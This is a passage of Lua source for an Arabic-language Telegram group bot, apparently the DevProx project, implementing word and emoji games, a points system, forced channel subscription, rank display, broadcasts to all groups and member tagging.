name = string.gsub(name,'اخطبوط','🐙')
name = string.gsub(name,'سمكه','🐟')
name = string.gsub(name,'خفاش','🦇')
name = string.gsub(name,'اسد','🦁')
name = string.gsub(name,'فأر','🐭')
name = string.gsub(name,'ذئب','🐺')
name = string.gsub(name,'فراشه','🦋')
name = string.gsub(name,'عقرب','🦂')
name = string.gsub(name,'زرافه','🦒')
name = string.gsub(name,'قنفذ','🦔')
name = string.gsub(name,'تفاحه','🍎')
name = string.gsub(name,'باذنجان','🍆')
DevProx = '📤┇ ما معنى هذا السمايل ؟  {'..name..'} '
Dev_Abs(msg.chat_id_, msg.id_, 1,DevProx, 1, 'md')
end
if text == ''..(DevAbs:get(DevProx..'bot:bkbk2'..msg.chat_id_) or 'لفاتع')..'' and not DevAbs:get(DevProx..'bot:l:id'..msg.chat_id_) then
if not DevAbs:get(DevProx..'bot:l:id'..msg.chat_id_) then 
DevProx = '📤┇ انت الرابح  \n📤┇ للعب مره اخرى ارسل المعاني '
Dev_Abs(msg.chat_id_, msg.id_, 1,DevProx, 1, 'md')
DevAbs:incrby(DevProx..'bot:add:num'..msg.chat_id_..msg.sender_user_id_, 1)  
end
DevAbs:set(DevProx..'bot:l:id'..msg.chat_id_,true)
end 
if text == 'العكس' and DevAbs:get(DevProx..'bot:lock_geam'..msg.chat_id_) then
DevAbs:del(DevProx..'bot:l:id'..msg.chat_id_)
DevProx2 = {'باي','فهمت','موزين','اسمعك','احبك','موحلو','نضيف','حاره','ناصي','جوه','سريع','ونسه','طويل','سمين','ضعيف','شريف','شجاع','رحت','عدل','نشيط','شبعان','موعطشان','خوش ولد','اني','هادئ'}
name = DevProx2[math.random(#DevProx2)]
DevAbs:set(DevProx..'bot:bkbk3'..msg.chat_id_,name)
name = string.gsub(name,'باي','هلو')
name = string.gsub(name,'فهمت','مافهمت')
name = string.gsub(name,'موزين','زين')
name = string.gsub(name,'اسمعك','ماسمعك')
name = string.gsub(name,'احبك','ماحبك')
name = string.gsub(name,'موحلو','حلو')
name = string.gsub(name,'نضيف','وصخ')
name = string.gsub(name,'حاره','بارده')
name = string.gsub(name,'ناصي','عالي')
name = string.gsub(name,'جوه','فوك')
name = string.gsub(name,'سريع','بطيء')
name = string.gsub(name,'ونسه','ضوجه')
name = string.gsub(name,'طويل','قزم')
name = string.gsub(name,'سمين','ضعيف')
name = string.gsub(name,'ضعيف','قوي')
name = string.gsub(name,'شريف','كواد')
name = string.gsub(name,'شجاع','جبان')
name = string.gsub(name,'رحت','اجيت')
name = string.gsub(name,'عدل','ميت')
name = string.gsub(name,'نشيط','كسول')
name = string.gsub(name,'شبعان','جوعان')
name = string.gsub(name,'موعطشان','عطشان')
name = string.gsub(name,'خوش ولد','موخوش ولد')
name = string.gsub(name,'اني','مطي')
name = string.gsub(name,'هادئ','عصبي')
DevProx = '📤┇ عكس كلمه ~ {'..name..'} '
Dev_Abs(msg.chat_id_, msg.id_, 1,DevProx, 1, 'md')
end
if text == ''..(DevAbs:get(DevProx..'bot:bkbk3'..msg.chat_id_) or 'لفاتع')..'' and not DevAbs:get(DevProx..'bot:l:id'..msg.chat_id_) then
if not DevAbs:get(DevProx..'bot:l:id'..msg.chat_id_) then 
DevProx = '📤┇ انت الرابح  \n📤┇ للعب مره اخرى ارسل العكس '
Dev_Abs(msg.chat_id_, msg.id_, 1,DevProx, 1, 'md')
DevAbs:incrby(DevProx..'bot:add:num'..msg.chat_id_..msg.sender_user_id_, 1)  
end
DevAbs:set(DevProx..'bot:l:id'..msg.chat_id_,true)
end 
if text == 'المختلف' and DevAbs:get(DevProx..'bot:lock_geam'..msg.chat_id_) then
DevAbs:del(DevProx..'bot:l:id'..msg.chat_id_)
DevProx2 = {'😸','☠','🐼','🐇','🌑','🌚','⭐️','📥','⛈','🌥','⛄️','👨‍🔬','👨‍💻','👨‍🔧','👩‍🍳','🧚‍♀','🧜‍♂','🧝‍♂','🙍‍♂','🧖‍♂','👬','👨‍👨‍👧','🕒','🕤','⌛️','📅',
};
name = DevProx2[math.random(#DevProx2)]
DevAbs:set(DevProx..'bot:bkbk4'..msg.chat_id_,name)
name = string.gsub(name,'😸','😹😹😹😹😹😹😹😹😸😹😹😹😹')
name = string.gsub(name,'☠','💀💀💀💀💀💀💀☠💀💀💀💀💀')
name = string.gsub(name,'🐼','👻👻👻👻👻👻👻🐼👻👻👻👻👻')
name = string.gsub(name,'🐇','🕊🕊🕊🕊🕊🐇🕊🕊🕊🕊')
name = string.gsub(name,'🌑','🌚🌚🌚🌚🌚🌑🌚🌚🌚')
name = string.gsub(name,'🌚','🌑🌑🌑🌑🌑🌚🌑🌑🌑')
name = string.gsub(name,'⭐️','🌟🌟🌟🌟🌟🌟🌟🌟⭐️🌟🌟🌟')
name = string.gsub(name,'📥','💫💫💫💫💫📥💫💫💫💫')
name = string.gsub(name,'⛈','🌨🌨🌨🌨🌨⛈🌨🌨🌨🌨')
name = string.gsub(name,'🌥','⛅️⛅️⛅️⛅️⛅️⛅️🌥⛅️⛅️⛅️⛅️')
name = string.gsub(name,'⛄️','☃☃☃☃☃☃⛄️☃☃☃☃')
name = string.gsub(name,'👨‍🔬','👩‍🔬👩‍🔬👩‍🔬👩‍🔬👩‍🔬👩‍🔬👩‍🔬👩‍🔬👨‍🔬👩‍🔬👩‍🔬👩‍🔬')
name = string.gsub(name,'👨‍💻','👩‍💻👩‍💻👩‍‍💻👩‍‍💻👩‍💻👨‍💻👩‍💻👩‍💻👩‍💻')
name = string.gsub(name,'👨‍🔧','👩‍🔧👩‍🔧👩‍🔧👩‍🔧👩‍🔧👩‍🔧👨‍🔧👩‍🔧')
name = string.gsub(name,'👩‍🍳','👨‍🍳👨‍🍳👨‍🍳👨‍🍳👨‍🍳👩‍🍳👨‍🍳👨‍🍳👨‍🍳')
name = string.gsub(name,'🧚‍♀','🧚‍♂🧚‍♂🧚‍♂🧚‍♂🧚‍♀🧚‍♂🧚‍♂')
name = string.gsub(name,'🧜‍♂','🧜‍♀🧜‍♀🧜‍♀🧜‍♀🧜‍♀🧚‍♂🧜‍♀🧜‍♀🧜‍♀')
name = string.gsub(name,'🧝‍♂','🧝‍♀🧝‍♀🧝‍♀🧝‍♀🧝‍♀🧝‍♂🧝‍♀🧝‍♀🧝‍♀')
name = string.gsub(name,'🙍‍♂️','🙎‍♂️🙎‍♂️🙎‍♂️🙎‍♂️🙎‍♂️🙍‍♂️🙎‍♂️🙎‍♂️🙎‍♂️')
name = string.gsub(name,'🧖‍♂️','🧖‍♀️🧖‍♀️🧖‍♀️🧖‍♀️🧖‍♀️🧖‍♂️🧖‍♀️🧖‍♀️🧖‍♀️🧖‍♀️')
name = string.gsub(name,'👬','👭👭👭👭👭👬👭👭👭')
name = string.gsub(name,'👨‍👨‍👧','👨‍👨‍👦👨‍👨‍👦👨‍👨‍👦👨‍👨‍👦👨‍👨‍👧👨‍👨‍👦👨‍👨‍👦')
name = string.gsub(name,'🕒','🕒🕒🕒🕒🕒🕒🕓🕒🕒🕒')
name = string.gsub(name,'🕤','🕥🕥🕥🕥🕥🕤🕥🕥🕥')
name = string.gsub(name,'⌛️','⏳⏳⏳⏳⏳⏳⌛️⏳⏳')
name = string.gsub(name,'📅','📆📆📆📆📆📆📅📆📆')
DevProx = '📤┇ اول واحد يطلع المختلف {'..name..'} يربح '
Dev_Abs(msg.chat_id_, msg.id_, 1,DevProx, 1, 'md')
end
if text == ''..(DevAbs:get(DevProx..'bot:bkbk4'..msg.chat_id_) or 'لفاتع')..'' and not DevAbs:get(DevProx..'bot:l:id'..msg.chat_id_) then
if not DevAbs:get(DevProx..'bot:l:id'..msg.chat_id_) then 
DevProx = '📤┇ انت الرابح  \n📤┇ للعب مره اخرى ارسل المختلف '
Dev_Abs(msg.chat_id_, msg.id_, 1,DevProx, 1, 'md')
DevAbs:incrby(DevProx..'bot:add:num'..msg.chat_id_..msg.sender_user_id_, 1)  
end
DevAbs:set(DevProx..'bot:l:id'..msg.chat_id_,true)
end  
if text == 'امثله' and DevAbs:get(DevProx..'bot:lock_geam'..msg.chat_id_) then
DevProx2 = {
'جوز','ضراطه','الحبل','الحافي','شقره','بيدك','سلايه','النخله','الخيل','حداد','المبلل','يركص','قرد','العنب','العمه','الخبز','بالحصاد','شهر','شكه','يكحله',
};
name = DevProx2[math.random(#DevProx2)]
DevAbs:set(DevProx..'bot:bkbk5'..msg.chat_id_,name)
DevAbs:del(DevProx..'bot:l:id'..msg.chat_id_)
name = string.gsub(name,'جوز','ينطي____للماعده سنون')
name = string.gsub(name,'ضراطه','الي يسوق المطي يتحمل___')
name = string.gsub(name,'بيدك','اكل___محد يفيدك')
name = string.gsub(name,'الحافي','تجدي من___نعال')
name = string.gsub(name,'شقره','مع الخيل يا___')
name = string.gsub(name,'النخله','الطول طول___والعقل عقل الصخلة')
name = string.gsub(name,'سلايه','بالوجه امراية وبالظهر___')
name = string.gsub(name,'الخيل','من قلة___شدو على الچلاب سروج')
name = string.gsub(name,'حداد','موكل من صخم وجهه كال آني___')
name = string.gsub(name,'المبلل','___ما يخاف من المطر')
name = string.gsub(name,'الحبل','اللي تلدغة الحية يخاف من جرة___')
name = string.gsub(name,'يركص','المايعرف___يكول الكاع عوجه')
name = string.gsub(name,'العنب','المايلوح___يكول حامض')
name = string.gsub(name,'العمه','___إذا حبت الچنة ابليس يدخل الجنة')
name = string.gsub(name,'الخبز','انطي___للخباز حتى لو ياكل نصه')
name = string.gsub(name,'باحصاد','اسمة___ومنجله مكسور')
name = string.gsub(name,'شهر','امشي__ولا تعبر نهر')
name = string.gsub(name,'شكه','يامن تعب يامن__يا من على الحاضر لكة')
name = string.gsub(name,'القرد','__بعين امه غزال')
name = string.gsub(name,'يكحله','اجه___عماها')
DevProx = '📤┇ اكمل المثل التالي {'..name..'} '
Dev_Abs(msg.chat_id_, msg.id_, 1,DevProx, 1, 'md')
end
if text == ''..(DevAbs:get(DevProx..'bot:bkbk5'..msg.chat_id_) or '57999')..'' then -- // المختلف
if not DevAbs:get(DevProx..'bot:l:id'..msg.chat_id_) then 
DevAbs:incrby(DevProx..'bot:add:num'..msg.chat_id_..msg.sender_user_id_, 1)  
DevAbs:del(DevProx..'bot:bkbk5'..msg.chat_id_)
DevProx = '📤┇ انت الرابح  \n📤┇ للعب مره اخرى ارسل امثله '
Dev_Abs(msg.chat_id_, msg.id_, 1,DevProx, 1, 'md')
end
DevAbs:set(DevProx..'bot:l:id'..msg.chat_id_,true)
end
if text == 'الالعاب' or text == 'اللعبه' then
if not DevAbs:get(DevProx..'bot:lock_geam'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤 ┇ الالعاب معطله \n🏟 ┇ ارسل { تفعيل اللعبه } لتفعيلها ', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1,[[*
🏷┇ اهلا بك في قائمه الالعاب ↓↓
➖➖➖➖➖➖➖
🏆┇ الالعاب المتوفره بالبوت ↓↓
➖➖➖➖➖➖➖
📤┇ ارسل امر { ترتيب } لبدء لعبه 
🚸┇ ارسل امر { سمايلات } لبدء لعبه 
📥┇ ارسل امر { حزوره } لبدء لعبه 
🛎┇ ارسل امر { المعاني } لبدء لعبه 
🏆┇ ارسل امر { العكس } لبدء لعبه 
👊🏻┇ ارسل امر { المحيبس } لبدء لعبه 
⏱┇ ارسل امر { امثله } لبدء لعبه 
🔔┇ ارسل امر { المختلف } لبدء لعبه 
➖➖➖➖➖➖➖
🔊┇ قناة السورس *[@DEV_PROX] 
]], 1, 'md')
end
end
---------------------------------
------------------------------------------------------------------------------------
if is_momod(msg.sender_user_id_, msg.chat_id_) and idf:match("-100(%d+)") and text:match("^ضع عدد النقاط (%d+)$")  then
local abs1 = { string.match(text, "^(ضع عدد النقاط) (%d+)$")}
Dev_Abs(msg.chat_id_, msg.id_, 1, "🚸┇تم وضع عدد نقاط البيع\n📤┇ يمكن للعضو بيع نقاط اللعبه\n🏆┇اذا كان عدد نقاطه اكبر من~ *"..abs1[2].."*\n",1, 'md')
DevAbs:set(DevProx.."DevProx_OO0" .. msg.chat_id_, abs1[2])
return false end
-------------------
if text == 'بيع نقاطي' then
if tonumber((DevAbs:get(DevProx..'bot:add:num'..msg.chat_id_..msg.sender_user_id_) or 0)) == 0 then
DevProx0 = '❌ ┇ ليس لديك نقاط العب اولا \n📤┇ للعب ارسل { سمايلات او ترتيب } '
Dev_Abs(msg.chat_id_, msg.id_, 1,DevProx0, 1, 'md') 
else
DevProx0 = (DevAbs:get(DevProx..'bot:add:num'..msg.chat_id_..msg.sender_user_id_) * tonumber(DevAbs:get('DevProx:'..bot_id..'gamepoint' .. msg.chat_id_)or 50))
DevAbs:incrby('DevProx:'..bot_id..'nummsg'..msg.chat_id_..msg.sender_user_id_,DevProx0)  
DevAbs:del(DevProx..'bot:add:num'..msg.chat_id_..msg.sender_user_id_)
DevProx0 = tonumber((DevAbs:get('DevProx:'..bot_id..'gamepoint' .. msg.chat_id_) or 50))
Dev_Abs(msg.chat_id_, msg.id_, 1,'☑️┇ تم بيع نقاطك \n📤┇ كل نقطه تساوي  '..DevProx0..' رساله ', 'md')
end
end
if text == "تعيين قناة الاشتراك" or text == "تغيير قناة الاشتراك" then
if not is_leader(msg) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ للمطور الاساسي فقط ', 1, 'md')
else
DevAbs:setex(DevProx..'DevProx4'..msg.sender_user_id_,300,true)
Dev_Abs(msg.chat_id_,msg.id_, 1, "*🏆┇ ارسل لي معرف قناة الاشتراك *\n", 1 , "md")
end end
if text == 'تفعيل الاشتراك الاجباري' then
if not is_leader(msg) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ للمطور الاساسي فقط ', 1, 'md')
else
if not DevAbs:get(DevProx..'DevProx3') then
Dev_Abs(msg.chat_id_,msg.id_, 1, "*🏆┇ لم يتم تعيين القناة \n📤┇ ارسل تعيين قناة الاشتراك *", 1 , "md")
return false 
end
if DevAbs:get(DevProx..'DevProx3') then
Dev_Abs(msg.chat_id_,msg.id_, 1, "*🏆┇ تم تفعيل الاشتراك الاجباري \n☑️┇ قم برفعي ادمن في قناتك *", 1 , "md")
DevAbs:set(DevProx.."DevProx2", true)
return false end end end
if text == 'تعطيل الاشتراك الاجباري' then
if not is_leader(msg) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ للمطور الاساسي فقط ', 1, 'md')
else
Dev_Abs(msg.chat_id_,msg.id_, 1, "*🏆┇ تم تعطيل الاشتراك الاجباري *\n", 1 , "md")
DevAbs:del(DevProx.."DevProx2")
return false 
end end
if text == 'جلب قناة الاشتراك' or text == 'قناة الاشتراك' then
if not is_leader(msg) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ للمطور الاساسي فقط ', 1, 'md')
else
local DevProx5 = DevAbs:get(DevProx.."DevProx3")
if DevProx5 then
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ *قناة الاشتراك* : ['..DevProx5..']', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ لم يتم تعيين القناة ', 1, 'md')
end end end
------------------------------------ With Pattern DevProx-------------------------------------------


----------DevProx
if text == 'رفع المشرفين' then  
local function promote_admin(extra, result, success)  
local num = 0
local admins = result.members_  
for i=0 , #admins do   
num = num + 1
DevAbs:sadd(DevProx..'bot:momod:'..msg.chat_id_, admins[i].user_id_)   
if result.members_[i].status_.ID == "ChatMemberStatusCreator" then  
owner_id = admins[i].user_id_  
DevAbs:sadd(DevProx..'bot:monsh:'..msg.chat_id_,owner_id)   
end  
end  
Dev_Abs(msg.chat_id_, msg.id_, 1, '\n*📤┇ تم رفع ('..num..') ادمنيه هنا \n🚏┇ وتم رفع منشئ المجموعه *', 1, 'md')
end
getChannelMembers(msg.chat_id_,0, 'Administrators', 100, promote_admin)
end
-------------DevProx
if is_momod(msg.sender_user_id_, msg.chat_id_) then
if text:match("^[Pp]ing$") or text:match("^فحص$") then
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ البوت شغال عزيزي  ', 1, 'md')
end
end 
------------------------------------DevProx-----------------------------------------------------------
if is_admin(msg.sender_user_id_, msg.chat_id_) then
name_bot = (DevAbs:get('DevProx:'..bot_id..'name_bot') or 'بروكس')
if text ==  ""..name_bot..' غادر' then
chat_leave(msg.chat_id_, bot_id)
DevAbs:srem(DevProx.."bot:groups",msg.chat_id_)
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ تم مغادره المجموعه وحذف بياناتها ', 1, 'md')
end
end
--------------DevProx
if (text:match("^موقعي$") or text:match("^رتبتي$")) and DevProx11(msg) then
function get_me(extra,result,success)
local DevProxy = (DevAbs:get('DevProx:'..bot_id..'nummsg'..msg.chat_id_..msg.sender_user_id_) or 0)
local DevProx = DevAbs:get(DevProx..'user:msgs'..bot_id..os.date('%d')..':'..msg.chat_id_..':'..msg.sender_user_id_) or 0
local msguser = tonumber(DevAbs:get(DevProx..'user:msgs'..msg.chat_id_..':'..msg.sender_user_id_))
local user_msgs = DevAbs:get(DevProx..'user:msgs'..msg.chat_id_..':'..msg.sender_user_id_)
local cont = (tonumber(DevAbs:get(DevProx..'bot:user:add'..msg.chat_id_..':'..msg.sender_user_id_)) or 0)
local user_nkt = tonumber(DevAbs:get(DevProx..'bot:add:num'..msg.chat_id_..msg.sender_user_id_) or 0)
local text = (tonumber(DevAbs:get(DevProx.."text:"..msg.sender_user_id_..":"..msg.chat_id_.."")) or "0" )
local sticker = (tonumber(DevAbs:get(DevProx.."sticker:"..msg.sender_user_id_..":"..msg.chat_id_.."")) or "0" )
local Photo = (tonumber(DevAbs:get(DevProx.."Photo:"..msg.sender_user_id_..":"..msg.chat_id_.."")) or "0" )
local Voice = (tonumber(DevAbs:get(DevProx.."Voice:"..msg.sender_user_id_..":"..msg.chat_id_.."")) or "0" )
local Gif = (tonumber(DevAbs:get(DevProx.."Gif:"..msg.sender_user_id_..":"..msg.chat_id_.."")) or "0" )
local Video = (tonumber(DevAbs:get(DevProx.."Video:"..msg.sender_user_id_..":"..msg.chat_id_.."")) or "0" )
if is_leaderid(result.id_) then
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
t = 'Bot Leader'
else
t = ' مطور اساسي'
end
elseif is_sudoid(result.id_) then
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
t = 'sudo 2'
else
t = 'مطور ثانويه'
end
elseif is_admin(result.id_) then
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
t = 'Dev 3'
else
t = 'مطور رتبه ثالثه'
end
elseif is_onall(result.id_) then
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
t = 'Owner All'
else
t = 'مدير عام'
end
elseif is_moall(result.id_) then
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
t = 'Momod All'
else
t = 'ادمن عام'
end
elseif is_vpall(result.id_) then
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
t = 'Vip All'
else
t = 'مميز عام'
end
elseif is_monsh(result.id_, msg.chat_id_) then
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
t = ' creator'
else
t = 'منشئ'
end
elseif is_owner(result.id_, msg.chat_id_) then
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
t = ' Owner'
else 
t = 'مدير'
end
elseif is_momod(result.id_, msg.chat_id_) then
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
t = 'momod'
else
t = 'ادمن'
end
elseif is_donky(result.id_, msg.chat_id_) then
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
t = 'Donky'
else
t = 'مطي واليكرم 😹💔'
end
elseif is_VipGroup(result.id_, msg.chat_id_) then
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
t = 'Vip'
else
t = 'عضو مميز'
end
else
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
t = 'Member'
else
t = 'فقط عضو'
end
end
function formsgg(msgs) 
local DevProx = ''  
if msgs < 100 then 
DevProx = 'كلش ضعيف 😫' 
elseif msgs < 250 then 
DevProx = 'ضعيف 😨' 
elseif msgs < 500 then 
DevProx = 'غير متفاعل 😒' 
elseif msgs < 750 then 
DevProx = 'متوسط 😎' 
elseif msgs < 1000 then 
DevProx = 'متفاعل 😘' 
elseif msgs < 2000 then 
DevProx = 'قمة التفاعل 😍' 
elseif msgs < 3000 then 
DevProx = 'ملك التفاعل 😻'  
elseif msgs < 4000 then 
DevProx = 'اسطورة التفاعل 🍃' 
elseif msgs < 5000 then 
DevProx = 'متفاعل نار كلش 🔥' 
elseif msgs < 5500 then 
DevProx = 'نار وشرار' 
elseif msgs < 6000 then 
DevProx = 'خيالي' 
elseif msgs < 7000 then 
DevProx = 'كافر بالتفاعل' 
elseif msgs < 8000 then 
DevProx = 'رب التفاعل ' 
end 
return DevProx
end
if result.username_ then
username = '@'..result.username_
else
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
username = 'Not Found'
else
username = 'لا يوجد'
end
end
if result.last_name_ then
lastname = result.last_name_
else
lastname = ''
end
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ Your name  '..result.first_name_..' '..lastname..' \n🎖┇ Your user  '..username..' \n📤┇ Your ID  '..result.id_..' \n⏰┇ Your Rank  '..t, 1, 'html')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '👋┇ اهلا بك { '..result.first_name_..' }\n\n🏆┇ معرفك  { '..username..' }\n🏆┇ ايديك  { '..result.id_..' }\n🐾┇ نقاطك { '..user_nkt..' }\n\n📃   { احصائيات الرسائل }\n📬┇ الرسائل { '..(user_msgs + DevProxy)..' / '..(DevProx)..'} \n💸┇ الملصقات { '..sticker..' }\n🚫┇ الصور  { '..Photo..' }\n🔊┇ الصوت { '..Voice..' }\n⏳┇ المتحركه { '..Gif..' }\n🎞┇ الفيديو{ '..Video..' }\n🕹┇ الجهات  { '..cont..' }\n\n📉┇ التفاعل { '..formsgg(msguser)..' } \n\n📤   موقعك  '..t, 1, 'html')
end 
end
getUser(msg.sender_user_id_,get_me)
end
if text:match("^الرتبه$") and msg.reply_to_message_id_ ~= 0 then
function rt_by_reply(extra, result, success) 
local user_info_ = DevAbs:get(DevProx..'user:Name' .. result.sender_user_id_)
local DevProx_res = user_info_
if user_info_ then
tdcli_function ({ID = "GetChatMember",chat_id_ = msg.chat_id_,user_id_ = result.sender_user_id_},function(arg,da) 
if da.status_.ID == "ChatMemberStatusCreator" then
renk_gps = 'المنشئ'
elseif da.status_.ID == "ChatMemberStatusEditor" then
renk_gps = 'الادمن'
elseif da.status_.ID == "ChatMemberStatusMember" then
renk_gps = 'عضو'
end
if result.id_ then
if tonumber(result.sender_user_id_) == tonumber(sudo) then
DevProx1 = "مطور اساسي 🎖"
elseif is_sudoid(result.sender_user_id_) then
DevProx1 = "مطور ثانوي"
elseif is_admin(result.sender_user_id_, msg.chat_id_) then
DevProx1 = "مطور رتبه ثالثه 🏁"
elseif is_onall(result.sender_user_id_) then
DevProx1 = "مدير عام 🌟"
elseif is_moall(result.sender_user_id_) then
DevProx1 = "ادمن عام 🌟"
elseif is_vpall(result.sender_user_id_) then
DevProx1 = "مميز عام 🌟"
elseif is_monsh(result.sender_user_id_, msg.chat_id_) then
DevProx1 = "منشئ 🌟"
elseif is_owner(result.sender_user_id_, msg.chat_id_) then
DevProx1 = "مدير 🌟"
elseif is_momod(result.sender_user_id_, msg.chat_id_) then
DevProx1 = "ادمن 🌟"
elseif is_VipGroup(result.sender_user_id_, msg.chat_id_) then
DevProx1 = "عضو مميز 🌟"
elseif is_donky(result.sender_user_id_, msg.chat_id_) then
DevProx1 = "مطي مرتب 😹💔"
else
DevProx1 = "عضو فقط 🌟"
end
end
local DevProx = '*🏆┇ اهلا بك عزيزي { '..renk_DevProx(msg)..' }*\n*📤┇ رتبه المستخدم* { '..DevProx_res..' }\n*🚸┇ في البوت { '..DevProx1..' }*\n*📥┇ في الكروب { '..renk_gps..' }*\n'
Dev_Abs(msg.chat_id_, msg.id_, 1,DevProx, 1, 'md') 
end,nil)
end
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,rt_by_reply)
end
-----------------------DevProx
if is_sudo(msg) then
if text == 'توجيه للكل' and tonumber(msg.reply_to_message_id_) > 0 then
function DevProx(extra,result,success)
local list = DevAbs:smembers(DevProx.."bot:groups")
for k,v in pairs(list) do
forwardMessages(v, msg.chat_id_, {[0] = result.id_}, 1)
end
end
local gps = DevAbs:scard(DevProx..'bot:groups') or 0
Dev_Abs(msg.chat_id_, msg.id_, 1, '🏆┇ تم نشر رسالتك بالتوجيه ✔️\n🏆┇ في : { '..gps..' } مجموعه 💠 ', 1, 'md')
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),DevProx)
end
if text:match("^اذاعه (.*)$") and is_sudo(msg) then  
local gps = DevAbs:scard(DevProx.."bot:groups") or 0
local gpss = DevAbs:smembers(DevProx.."bot:groups") or 0
local rwss = {string.match(text, "^(اذاعه) (.*)$")}
local bib = rwss[2]
for i=1, #gpss do
Dev_Abs(gpss[i], 0, 1, bib, 1, 'md')
end
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ Your Message send to :{ '..gps..' } groups ', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '🚸┇ تم نشر رسالتك ✔️\n🏆┇ في : { '..gps..' } مجموعه 💠 ', 1, 'md')
end
end
end
if text:match("^(time)$") or text:match("^(الوقت)$")  then
Dev_Abs(msg.chat_id_, msg.id_, 1, '⏰ ┇ الساعه ~ '..os.date("%I:%M%p")..' \n📆 ┇ التاريخ ~  '..os.date("%Y/%m/%d")..' \n', 1, 'md')
end
if text:match("^زخرفه$")  then  
DevAbs:setex(DevProx.."zr:wordd" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 10000, true)  
DevAbs:setex(DevProx.."zr:word" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 10000, true)
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ ارسل الكلمه لزخرفتها \n📤┇ يمكن الزخرفه باللغتين {ar , en}', 1, 'md')
end
--------------------
if text:match("^مشاهده المنشور$") then
DevAbs:set(DevProx..'bot:viewget'..msg.sender_user_id_,true)
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '> Plese forward your post : ', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ ارسل لي المنشور الان ', 1, 'md')
end
end
----- DevProx
if text:match("^اطردني$") then
if not DevAbs:get(DevProx.."lock_kickme"..msg.chat_id_) then
DevAbs:set(DevProx..'yes'..msg.sender_user_id_..'', 'kickyes')
DevAbs:set(DevProx..'no'..msg.sender_user_id_..'', 'kickno')
Dev_Abs(msg.chat_id_, msg.id_, 1, "📤┇ ارسل *{ نعم }* ليتم طردك\n⏰┇ ارسل *{ لا } *ليتم الغاء طردك ", 1, "md")
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ هذه الخاصيه معطله ', 1, 'md')
end
end
local kickme = DevAbs:get(DevProx..'yes'..msg.sender_user_id_..'')
if kickme == 'kickyes' then
if text:match("^نعم$") then
if is_VipGroup(msg.sender_user_id_, msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, "📤┇ لا استطيع طرد المشرفين ", 1, "md")
else
local kickme = DevAbs:get(DevProx..'yes'..msg.sender_user_id_..'')
if kickme == 'kickyes' then
chat_kick(msg.chat_id_, msg.sender_user_id_)
DevAbs:del(DevProx..'yes'..msg.sender_user_id_..'', 'kickyes')
DevAbs:del(DevProx..'no'..msg.sender_user_id_..'', 'kickno')
Dev_Abs(msg.chat_id_, msg.id_, 1, "📤┇ تم طردك لا ترجع بعد ", 1, "md")
end
end
end
if text:match("^لا$") then
local notkickme = DevAbs:get(DevProx..'no'..msg.sender_user_id_..'')
if notkickme == 'kickno' then
DevAbs:del(DevProx..'yes'..msg.sender_user_id_..'', 'kickyes')
DevAbs:del(DevProx..'no'..msg.sender_user_id_..'', 'kickno')
Dev_Abs(msg.chat_id_, msg.id_, 1, "📤┇ تم الغاء طردك لا تشاقه هيج شقه ", 1, "md")
end
end
end   
if text == 'تعطيل اطردني' and is_owner(msg.sender_user_id_, msg.chat_id_) then
if not DevAbs:get(DevProx.."lock_kickme"..msg.chat_id_) then
DevAbs:set(DevProx.."lock_kickme"..msg.chat_id_, true)
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ تم تعطيل امر اطردني ', 1, 'md')
end
end
if text == 'تفعيل اطردني' and is_owner(msg.sender_user_id_, msg.chat_id_) then
if DevAbs:get(DevProx.."lock_kickme"..msg.chat_id_) then
DevAbs:del(DevProx.."lock_kickme"..msg.chat_id_)
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ تم تفعيل امر اطردني ', 1, 'md')
end
end
if is_momod(msg.sender_user_id_, msg.chat_id_) then
if text and text == "تاك للكل" then
function tall(A1, A2)
local text = "🏆┇ وينكم اخوان \n~~~~~~~~~~~~~~~~~~~~\n"
i = 0
for k, v in pairs(A2.members_) do
i = i + 1
local user_info = DevAbs:hgetall('user:'..v.user_id_)  
if user_info and user_info.username then
local username = user_info.username
text = text.."<b> "..i.." ┇</b> { @"..username.." }\n"
end
end 
Dev_Abs(msg.chat_id_, msg.id_, 1, text, 1, 'html')
print(text)
end
tdcli_function({ID = "GetChannelMembers",channel_id_ = getChatId(msg.chat_id_).ID, offset_ = 0,limit_ = 200000},tall,nil)
end
